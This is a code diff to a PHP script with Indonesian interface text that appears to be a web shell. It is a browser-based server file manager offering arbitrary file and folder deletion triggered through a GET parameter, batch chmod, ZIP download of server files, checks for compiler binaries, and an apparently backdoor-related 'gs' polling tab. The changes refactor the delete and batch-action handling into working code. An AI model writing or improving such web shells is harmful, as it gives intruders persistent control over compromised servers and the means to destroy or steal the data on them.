@@ -299,6 +299,27 @@ if (isset($_GET['img']) && $_GET['img'] != '') {
         @readfile($img); exit;
     }
 }
+if (isset($_GET['delete_path']) && $_GET['delete_path'] !== '') {
+        $real = safe_real($_GET['delete_path']);
+        if ($real === false) {
+            $msg = 'Target tidak ditemukan: ' . h($_GET['delete_path']);
+        } elseif (!is_file($real) && !is_dir($real)) {
+            $msg = 'Bukan file/folder valid.';
+        } elseif (is_file($real)) {
+            if (@unlink($real)) {
+                $msg = 'File berhasil dihapus: ' . h(basename($real));
+            } else {
+                $e = error_get_last();
+                $msg = 'Gagal hapus file: ' . h(basename($real)) . ' — ' . h($e['message'] ?? 'unknown');
+            }
+        } elseif (is_dir($real)) {
+            if (delete_directory($real)) {
+                $msg = 'Folder berhasil dihapus: ' . h(basename($real));
+            } else {
+                $msg = 'Gagal hapus folder (permission/isi terkunci): ' . h(basename($real));
+            }
+        }
+}
 if (isset($_POST['action'])) {
     $action = $_POST['action'];
     $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
@@ -313,14 +334,7 @@ if (isset($_POST['action'])) {
         }
         $cwd_real = $path_real;
     }
-    if ($action == 'delete') {
-        $target = isset($_POST['target']) ? $_POST['target'] : '';
-        if ($target != '') {
-            if (@is_file($target)) { if (@unlink($target)) $msg = 'File berhasil dihapus'; else $msg = 'Gagal hapus file'; }
-            elseif (@is_dir($target)) { if (delete_directory($target)) $msg = 'Folder beserta isinya berhasil dihapus'; else $msg = 'Gagal hapus folder (periksa permission)'; }
-        }
-        $cwd_real = $path_real;
-    }
+    
     if ($action == 'rename') {
         $old = isset($_POST['old']) ? $_POST['old'] : '';
         $new = isset($_POST['new']) ? $_POST['new'] : '';
@@ -623,33 +637,16 @@ $crit = array(
     'gcc'       => (bool)which_bin('gcc'),
 );
 
-if (isset($_POST['batch_action'])) {
-    $ids = isset($_POST['batch_files']) ? $_POST['batch_files'] : array();
-    $op  = $_POST['batch_action'];
+if (isset($_POST['batch_action']) && $_POST['batch_action'] !== '') {
+    $ids = isset($_POST['batch_files']) ? (array)$_POST['batch_files'] : array();
+    $op  = (string)$_POST['batch_action'];
     $cnt = 0;
-    
-    if (!empty($ids)) {
-        foreach ($ids as $fname) {
-            $full = $cwd_real . '/' . basename($fname);
-            if (!file_exists($full)) continue;
 
-            if ($op === 'delete') {
-                if (is_dir($full)) {
-                    if (delete_directory($full)) $cnt++;
-                } else {
-                    if (@unlink($full)) $cnt++;
-                }
-            } 
-            elseif ($op === 'chmod') {
-                $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
-                if (@chmod($full, $mode)) $cnt++;
-            }
-            elseif ($op === 'zip') {
-                $cnt++;
-            }
-        }
-        
-        if ($op === 'zip') {
+    // Kalau ZIP, langsung proses dan exit — jangan lanjut ke delete
+    if ($op === 'zip') {
+        if (empty($ids)) {
+            $batch_msg = 'Tidak ada file yang dipilih.';
+        } else {
             $tmp = sys_get_temp_dir() . '/zip_' . bin2hex(random_bytes(6)) . '.zip';
             if (class_exists('ZipArchive')) {
                 $zip = new ZipArchive();
@@ -660,19 +657,40 @@ if (isset($_POST['batch_action'])) {
                     }
                     $zip->close();
                     header('Content-Type: application/zip');
-                    header('Content-Disposition: attachment; filename="batch_download_' . date('Ymd_His') . '.zip"');
+                    header('Content-Disposition: attachment; filename="batch_' . date('Ymd_His') . '.zip"');
+                    header('Content-Length: ' . filesize($tmp));
                     readfile($tmp);
                     @unlink($tmp);
                     exit;
                 }
             } else {
-                $batch_msg = 'ZipArchive class tidak tersedia di server ini.';
+                $batch_msg = 'ZipArchive tidak tersedia.';
             }
+        }
+    }
+    // Kalau delete atau chmod, jalanin operasinya
+    elseif ($op === 'delete' || $op === 'chmod') {
+        if (empty($ids)) {
+            $batch_msg = 'Tidak ada file yang dipilih.';
         } else {
+            foreach ($ids as $fname) {
+                $full = $cwd_real . '/' . basename($fname);
+                if (!file_exists($full)) continue;
+                if ($op === 'delete') {
+                    if (is_dir($full)) {
+                        if (delete_directory($full)) $cnt++;
+                    } else {
+                        if (@unlink($full)) $cnt++;
+                    }
+                } elseif ($op === 'chmod') {
+                    $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
+                    if (@chmod($full, $mode)) $cnt++;
+                }
+            }
             $batch_msg = "Batch $op: $cnt file berhasil diproses.";
         }
     } else {
-        $batch_msg = 'Tidak ada file yang dipilih.';
+        $batch_msg = 'Operasi tidak dikenali: ' . h($op);
     }
 }
 
@@ -1514,6 +1532,7 @@ if ($view != '' && @is_file($view)) { ?>
         <div class="name">Directory List</div>
         <div style="margin-top:10px;">
             <form method="post" id="batchForm" autocomplete="off">
+                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                 <div id="batchActionBar" style="display:none; margin-bottom:10px; gap:8px; align-items:center; flex-wrap:wrap; background:#1b2330; padding:10px; border-radius:8px; border:1px solid #3a4f6e;">
                     <span style="font-weight:bold; color:#fff;">Batch Action:</span>
                     <input type="text" name="batch_mode" placeholder="(mis: 0755)" style="width:100px;">
@@ -1608,23 +1627,15 @@ if ($view != '' && @is_file($view)) { ?>
                                 <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                                 <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                             <?php } else { ?>
-                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
-                                <form method="post" style="display:inline;" onsubmit="return confirm('Download folder ini sebagai ZIP?');">
-                                    <input type="hidden" name="action" value="zip_folder">
-                                    <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
-                                    <input type="hidden" name="target" value="<?php echo h($full); ?>">
-                                    <input type="submit" class="btn btn-blue" value="ZIP" style="padding:2px 6px;font-size:10px;">
-                                </form>
+                                                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
+                                <button type="button" class="btn btn-blue" onclick="confirmZipFolder('<?php echo h(addslashes($cwd_real)); ?>', '<?php echo h(addslashes($full)); ?>')" style="padding:2px 6px;font-size:10px;">ZIP</button>
                             <?php } ?>
                             <a class="btn" href="?action_page=rename&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Rename</a>
                             <a class="btn" href="?action_page=chmod&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Chmod</a>
                             <a class="btn" href="?action_page=touch&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Touch</a>
-                            <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
-                                <input type="hidden" name="action" value="delete">
-                                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
-                                <input type="hidden" name="target" value="<?php echo h($full); ?>">
-                                <input type="submit" class="btn btn-red" value="Delete" style="padding:2px 6px;font-size:10px;">
-                            </form>
+                            <button type="button" class="btn btn-red"
+    onclick="if(confirm('Yakin hapus <?php echo h(addslashes($item)); ?>?')){location.href='?path=<?php echo urlencode($cwd_real); ?>&delete_path=<?php echo urlencode($full); ?>';}"
+    style="padding:2px 6px;font-size:10px;">Delete</button>
                         </td>
                     </tr>
                     <?php
@@ -1635,6 +1646,16 @@ if ($view != '' && @is_file($view)) { ?>
                     ?>
                 </table>
                 </div>
+            </form>
+            <form method="post" id="zipFolderForm" style="display:none;">
+                <input type="hidden" name="action" value="zip_folder">
+                <input type="hidden" name="path" id="zipPath" value="">
+                <input type="hidden" name="target" id="zipTarget" value="">
+            </form>
+            <form method="post" id="delForm" style="display:none;">
+                <input type="hidden" name="action" value="delete">
+                <input type="hidden" name="path" id="delPath" value="">
+                <input type="hidden" name="target" id="delTarget" value="">
             </form>
         </div>
     </div>
@@ -1728,6 +1749,18 @@ function toggleActionBar() {
     } else {
         bar.style.display = 'none';
     }
+}
+function confirmDelete(path, target) {
+    if (!confirm('Yakin hapus ' + target + '?')) return;
+    document.getElementById('delPath').value = path;
+    document.getElementById('delTarget').value = target;
+    document.getElementById('delForm').submit();
+}
+function confirmZipFolder(path, target) {
+    if (!confirm('Download folder ' + target + ' sebagai ZIP?')) return;
+    document.getElementById('zipPath').value = path;
+    document.getElementById('zipTarget').value = target;
+    document.getElementById('zipFolderForm').submit();
 }
 statPoll(); setInterval(statPoll, 1500);
 <?php if ($tab === 'gs'): ?>gsPoll(); setInterval(gsPoll, 3000);<?php endif; ?>
